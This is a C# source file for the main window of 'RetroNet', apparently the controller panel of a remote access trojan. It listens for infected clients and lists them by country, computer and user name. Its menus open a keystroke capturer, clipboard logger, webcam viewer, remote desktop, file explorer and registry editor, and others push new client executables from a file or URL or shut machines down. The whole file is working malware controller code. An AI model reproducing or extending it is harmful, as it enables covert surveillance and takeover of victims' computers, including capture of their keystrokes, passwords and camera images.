using RetroNet.Classes;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RetroNet.Forms
{
    public partial class Main : Form
    {
        private Config _configuration;
        private ConfigurationDialog _configD;
        private ClientBuilderDialog _clientBuilderD;
        private PluginsDialog _pluginsD;
        private UPnPDialog _upnpD;
        private FileTransfersDialog _fileTransfersD;
        private LogDialog _logD;
        private NewsDialog _newsD;
        private AboutDialog _aboutD;
        private bool _listening;
        private Dictionary<int, TcpListener> _listeners;
        private long _dataSent;
        private long _dataReceived;
        private RSACryptoServiceProvider _rsa;
        private int _connectedUsers;

        public Main()
        {
            InitializeComponent();

            _configuration = new Config(Application.StartupPath + @"\Settings.ini");

            _configD = new ConfigurationDialog(_configuration);
            _clientBuilderD = new ClientBuilderDialog();
            _pluginsD = new PluginsDialog();
            _upnpD = new UPnPDialog();
            _fileTransfersD = new FileTransfersDialog();
            _logD = new LogDialog();
            _newsD = new NewsDialog();
            _aboutD = new AboutDialog();

            _listening = false;
            _listeners = new Dictionary<int, TcpListener>();

            _dataSent = 0;
            _dataReceived = 0;

            _rsa = new RSACryptoServiceProvider(2048);
            _connectedUsers = 0;
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = MessageBox.Show("Are you sure to exit?", string.Empty, MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No;
        }

        private void connectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (connectToolStripMenuItem.Text == "Connect")
            {
                _listening = true;

                foreach (int port in _configuration.Ports)
                {
                    Thread t = new Thread(() =>
                        {
                            TcpListener listener = new TcpListener(IPAddress.Any, port);

                            listener.Start();
                            _listeners.Add(port, listener);

                            while (_listening)
                            {
                                try
                                {
                                    Connection c = new Connection(listener.AcceptTcpClient());
                                    
                                    c.OnDisconnectEvent += c_OnDisconnectEvent;
                                    c.OnDataSentEvent += c_OnDataSentEvent;
                                    c.OnDataReceivedEvent += c_OnDataReceivedEvent;

                                    c.beginRead();
                                    
                                    Packet p = new Packet(Command.EncryptionKey);
                                    p.addData(_rsa.ExportCspBlob(false));
                                    
                                    c.send(p.toArray());
                                }
                                catch { }
                            }
                        });

                    t.SetApartmentState(ApartmentState.STA);
                    t.IsBackground = true;
                    t.Start();
                }

                connectToolStripMenuItem.Text = "Disconnect";
            }
            else
            {
                _listening = false;

                foreach (TcpListener listener in _listeners.Values)
                    listener.Stop();

                foreach (ListViewItem l in connectionsListView.Items)
                    ((Connection)l.Tag).send(new Packet(Command.CloseSocket).toArray());

                resetData();
                connectToolStripMenuItem.Text = "Connect";
            }
        }

        private void configurationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _configD.safeInvoke(() =>
                {
                    if (_configD.CanFocus)
                    {
                        _configD.Activate();
                    }
                    else
                    {
                        _configD = new ConfigurationDialog(_configuration);

                        Thread t = new Thread(() =>
                            {
                                if (_configD.ShowDialog() == DialogResult.OK)
                                    _configuration.save();
                            });

                        t.SetApartmentState(ApartmentState.STA);
                        t.IsBackground = true;
                        t.Start();
                    }
                });
        }

        private void clientBuilderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _clientBuilderD.safeInvoke(() =>
                {
                    if (_clientBuilderD.CanFocus)
                    {
                        _clientBuilderD.Activate();
                    }
                    else
                    {
                        _clientBuilderD = new ClientBuilderDialog();
                        _clientBuilderD.Show();
                    }
                });
        }

        private void pluginsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _pluginsD.safeInvoke(() =>
            {
                if (_pluginsD.CanFocus)
                {
                    _pluginsD.Activate();
                }
                else
                {
                    _pluginsD = new PluginsDialog();
                    _pluginsD.Show();
                }
            });
        }

        private void uPnPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _upnpD.safeInvoke(() =>
            {
                if (_upnpD.CanFocus)
                {
                    _upnpD.Activate();
                }
                else
                {
                    _upnpD = new UPnPDialog();
                    _upnpD.Show();
                }
            });
        }

        private void fileTransfersToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _fileTransfersD.safeInvoke(() =>
            {
                if (_fileTransfersD.CanFocus)
                {
                    _fileTransfersD.Activate();
                }
                else
                {
                    _fileTransfersD = new FileTransfersDialog();
                    _fileTransfersD.Show();
                }
            });
        }

        private void logToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _logD.safeInvoke(() =>
            {
                if (_logD.CanFocus)
                {
                    _logD.Activate();
                }
                else
                {
                    _logD = new LogDialog();
                    _logD.Show();
                }
            });
        }

        private void newsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _newsD.safeInvoke(() =>
            {
                if (_newsD.CanFocus)
                {
                    _newsD.Activate();
                }
                else
                {
                    _newsD = new NewsDialog();
                    _newsD.Show();
                }
            });
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _aboutD.safeInvoke(() =>
            {
                if (_aboutD.CanFocus)
                {
                    _aboutD.Activate();
                }
                else
                {
                    _aboutD = new AboutDialog();
                    _aboutD.Show();
                }
            });
        }

        private void connectionsListView_SelectedIndexChanged(object sender, EventArgs e)
        {
            selectedUsersValueLabel.Text = connectionsListView.SelectedItems.Count.ToString();
        }

        private void functionsMenuStrip_Opening(object sender, CancelEventArgs e)
        {
            e.Cancel = connectionsListView.SelectedItems.Count == 0;
        }

        private void uninstallClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you wish to do this?", string.Empty, MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                sendToSelected(new Packet(Command.UninstallClient).toArray());
        }

        private void restartClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToSelected(new Packet(Command.RestartClient).toArray());
        }

        private void fromFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog() { Filter = "Executable File|*exe" })
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    Packet toSend = new Packet(Command.UpdateClientFile);
                    toSend.addData(File.ReadAllBytes(ofd.FileName));
                    sendToSelected(toSend.toArray());
                }
            }
        }

        private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (InputDialog id = new InputDialog("Type in a url:", string.Empty))
            {
                if (id.ShowDialog() == DialogResult.OK)
                {
                    Packet toSend = new Packet(Command.UpdateClientUrl);
                    toSend.addData(id.Input);
                    sendToSelected(toSend.toArray());
                }
            }
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.RemoteDesktop.CanFocus)
                {
                    c.RemoteDesktop.Activate();
                }
                else
                {
                    c.RemoteDesktop = new RemoteDesktopDialog(c);
                    c.RemoteDesktop.Show();
                }
            }
        }

        private void webcamViewerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.WebcamViewer.CanFocus)
                {
                    c.WebcamViewer.Activate();
                }
                else
                {
                    c.WebcamViewer = new WebcamDialog(c);
                    c.WebcamViewer.Show();
                }
            }
        }

        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.FileExplorer.CanFocus)
                {
                    c.FileExplorer.Activate();
                }
                else
                {
                    c.FileExplorer = new FileExplorerDialog(c);
                    c.FileExplorer.Show();
                }
            }
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.ProcessManager.CanFocus)
                {
                    c.ProcessManager.Activate();
                }
                else
                {
                    c.ProcessManager = new ProcessManagerDialog(c);
                    c.ProcessManager.Show();
                }
            }
        }

        private void keystrokeCapturerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.KeystrokeCapturer.CanFocus)
                {
                    c.KeystrokeCapturer.Activate();
                }
                else
                {
                    c.KeystrokeCapturer = new KeystrokeCapturerDialog(c);
                    c.KeystrokeCapturer.Show();
                }
            }
        }

        private void clipboardTrackerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.ClipboardLogger.CanFocus)
                {
                    c.ClipboardLogger.Activate();
                }
                else
                {
                    c.ClipboardLogger = new ClipboardLoggerDialog(c);
                    c.ClipboardLogger.Show();
                }
            }
        }

        private void applicationHandlerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.ApplicationHandler.CanFocus)
                {
                    c.ApplicationHandler.Activate();
                }
                else
                {
                    c.ApplicationHandler = new ApplicationHandlerDialog(c);
                    c.ApplicationHandler.Show();
                }
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.RegistryEditor.CanFocus)
                {
                    c.RegistryEditor.Activate();
                }
                else
                {
                    c.RegistryEditor = new RegistryEditorDialog(c);
                    c.RegistryEditor.Show();
                }
            }
        }

        private void startupMonitorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.StartupMonitor.CanFocus)
                {
                    c.StartupMonitor.Activate();
                }
                else
                {
                    c.StartupMonitor = new StartupMonitorDialog(c);
                    c.StartupMonitor.Show();
                }
            }
        }

        private void serviceAdministerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.ServiceAdminister.CanFocus)
                {
                    c.ServiceAdminister.Activate();
                }
                else
                {
                    c.ServiceAdminister = new ServiceAdministerDialog(c);
                    c.ServiceAdminister.Show();
                }
            }
        }

        private void instantMessengerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
            {
                Connection c = (Connection)l.Tag;

                if (c.InstantMessenger.CanFocus)
                {
                    c.InstantMessenger.Activate();
                }
                else
                {
                    c.InstantMessenger = new InstantMessengerDialog(c);
                    c.InstantMessenger.Show();
                }
            }
        }

        private void shutDownComputerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToSelected(new Packet(Command.ShutDownComputer).toArray());
        }

        private void restartComputerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToSelected(new Packet(Command.RestartComputer).toArray());
        }

        private void logOffComputerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToSelected(new Packet(Command.LogOffComputer).toArray());
        }

        private void sendToSelected(byte[] data)
        {
            foreach (ListViewItem l in connectionsListView.SelectedItems)
                ((Connection)l.Tag).send(data);
        }

        private void resetData()
        {
            Interlocked.Add(ref _connectedUsers, -_connectedUsers);
            _listeners.Clear();

            connectionsListView.safeInvoke(() =>
                {
                    connectionsListView.Items.Clear();
                });

            connectedUsersValueLabel.Text = "0";
            selectedUsersValueLabel.Text = "0";

        }

        private void c_OnDataReceivedEvent(Connection client, byte[] data)
        {
            try
            {
                Packet p = new Packet(data);

                switch (p.Command)
                {
                    case Command.EncryptionKey:
                        handleEncryption(client, p);
                        break;
                    case Command.ConnectInfo:
                        handleConnectionInfo(client, p);
                        break;
                    case Command.CpuRam:
                        handleCpuRam(client, p);
                        break;
                    case Command.RemoteDesktopImage:
                        handleRemoteDesktopImage(client, p);
                        break;
                    case Command.WebcamImage:
                        handleWebcamImage(client, p);
                        break;
                    case Command.GetRootDrives:
                        client.FileExplorer.updateRootDrives(p);
                        break;
                    case Command.Navigate:
                        client.FileExplorer.updateFiles(p);
                        break;
                    case Command.UploadFilePart:
                        handleUploadFilePart(client, p);
                        break;
                    case Command.DownloadFilePart:
                        handleDownloadFilePart(client, p);
                        break;
                    case Command.GetProcessList:
                        handleGetProcessList(client, p);
                        break;
                    case Command.KeystrokeInfo:
                        handleKeystrokeInfo(client, p);
                        break;
                    case Command.ClipboardInfo:
                        handleClipboardInfo(client, p);
                        break;
                    case Command.GetApplications:
                        handleGetApplications(client, p);
                        break;
                }

                handleDataReceived(data.Length);
            }
            catch { }
        }

        private void c_OnDataSentEvent(Connection client, byte[] data)
        {
            handleDataSent(data.Length);
        }

        private void c_OnDisconnectEvent(Connection client)
        {
            lock (connectionsListView)
            {
                connectionsListView.safeInvoke(() =>
                    {
                        connectionsListView.Items[client.IPAddress + ":" + client.Port].Remove();
                    });

                closeWindows(client);
                Interlocked.Decrement(ref _connectedUsers);

                connectedUsersValueLabel.Text = _connectedUsers.ToString();
            }
        }

        private void closeWindow(Form f)
        {
            f.safeBeginInvoke(() =>
                {
                    if (f.CanFocus)
                        f.Close();
                });
        }

        private void closeWindows(Connection client)
        {
            closeWindow(client.RemoteDesktop);
            closeWindow(client.WebcamViewer);
            closeWindow(client.FileExplorer);
            closeWindow(client.ProcessManager);
            closeWindow(client.KeystrokeCapturer);
            closeWindow(client.ClipboardLogger);
            closeWindow(client.ApplicationHandler);
            closeWindow(client.RegistryEditor);
            closeWindow(client.StartupMonitor);
            closeWindow(client.ServiceAdminister);
            closeWindow(client.InstantMessenger);
        }

        private void handleDataReceived(int length)
        {
            lock (dataReceivedValueLabel)
            {
                _dataReceived += length;
                dataReceivedValueLabel.Text = Sizer.convertSize(_dataReceived);
            }
        }

        private void handleDataSent(int length)
        {
            lock (dataSentValueLabel)
            {
                _dataSent += length;
                dataSentValueLabel.Text = Sizer.convertSize(_dataSent);
            }
        }

        private void handleEncryption(Connection client, Packet p)
        {
            client.createEncryption(_rsa.Decrypt(p.Data[0], true), _rsa.Decrypt(p.Data[1], true));
            client.send(new Packet(Command.ConnectInfo).toArray());
        }

        private void handleConnectionInfo(Connection client, Packet p)
        {
            string key = Encoding.Unicode.GetString(p.Data[0]) + ".png";
            string country = Encoding.Unicode.GetString(p.Data[1]);
            string identity = Encoding.Unicode.GetString(p.Data[2]);
            string os = Encoding.Unicode.GetString(p.Data[3]);
            string computerName = Encoding.Unicode.GetString(p.Data[4]);
            string userName = Encoding.Unicode.GetString(p.Data[5]);
            string cpu = Encoding.Unicode.GetString(p.Data[6]) + "%";
            string ram = Encoding.Unicode.GetString(p.Data[7]) + "%";
            string version = Encoding.Unicode.GetString(p.Data[8]);

            ListViewItem l = new ListViewItem(new string[] { country, identity, client.IPAddress.ToString(), client.Port.ToString(), os, computerName, userName, cpu, ram, version }) { ImageKey = key, Name = client.IPAddress.ToString() + ":" + client.Port.ToString(), Tag = client };

            lock (connectionsListView)
            {
                connectionsListView.safeInvoke(() =>
                    {
                        connectionsListView.Items.Add(l);
                    });
            }

            Interlocked.Increment(ref _connectedUsers);
            connectedUsersValueLabel.Text = _connectedUsers.ToString();
        }

        private void handleCpuRam(Connection client, Packet p)
        {
            lock (connectionsListView)
            {
                connectionsListView.safeInvoke(() =>
                    {
                        string key = client.IPAddress.ToString() + ":" + client.Port.ToString();

                        connectionsListView.Items[key].SubItems[7].Text = Encoding.Unicode.GetString(p.Data[0]) + "%";
                        connectionsListView.Items[key].SubItems[8].Text = Encoding.Unicode.GetString(p.Data[1]) + "%";
                    });
            }
        }

        private Image byteToImage(byte[] data)
        {
            return Image.FromStream(new MemoryStream(data));
        }

        private void handleRemoteDesktopImage(Connection client, Packet p)
        {
            client.RemoteDesktop.updateImage(byteToImage(p.Data[0]));
        }

        private void handleWebcamImage(Connection client, Packet p)
        {
            client.WebcamViewer.updateImage(byteToImage(p.Data[0]));
        }

        private void handleUploadFilePart(Connection client, Packet p)
        {
            int id = Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

            lock (client.Uploads)
                client.Uploads[id].release();
        }

        private void handleDownloadFilePart(Connection client, Packet p)
        {
            int id = Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

            lock (client.Downloads)
                client.Downloads[id].writeChunk(p.Data[1]);
        }

        private void handleGetProcessList(Connection client, Packet p)
        {
            if (client.ProcessManager != null)
            {
                client.ProcessManager.safeInvoke(() =>
                {
                    client.ProcessManager.updateList(p);
                });
            }
        }

        private void handleKeystrokeInfo(Connection client, Packet p)
        {
            if (client.KeystrokeCapturer != null)
            {
                client.KeystrokeCapturer.safeInvoke(() =>
                    {
                        client.KeystrokeCapturer.updateKeystroke(p);
                    });
            }
        }

        private void handleClipboardInfo(Connection client, Packet p)
        {
            if (client.ClipboardLogger != null)
            {
                client.ClipboardLogger.safeInvoke(() =>
                {
                    client.ClipboardLogger.updateClipboard(p);
                });
            }
        }

        private void handleGetApplications(Connection client, Packet p)
        {
            if (client.ApplicationHandler != null)
            {
                client.ApplicationHandler.safeInvoke(() =>
                {
                    client.ApplicationHandler.updateApplications(p);
                });
            }
        }
    }
}
